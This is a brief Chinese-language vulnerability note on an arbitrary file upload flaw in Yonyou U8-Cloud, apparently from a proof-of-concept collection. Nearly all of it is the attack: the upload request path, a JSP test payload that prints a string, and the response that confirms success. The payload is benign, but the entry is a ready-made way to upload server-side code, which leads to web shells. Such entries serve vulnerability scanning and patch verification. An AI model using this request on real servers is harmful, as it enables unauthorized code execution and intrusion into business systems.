# 用友U8-Cloud存在任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /linux/pages/upload.jsp HTTP/1.1`

**Payload**
```
<% out.println("dude");%>
```
- **响应特征**：200 success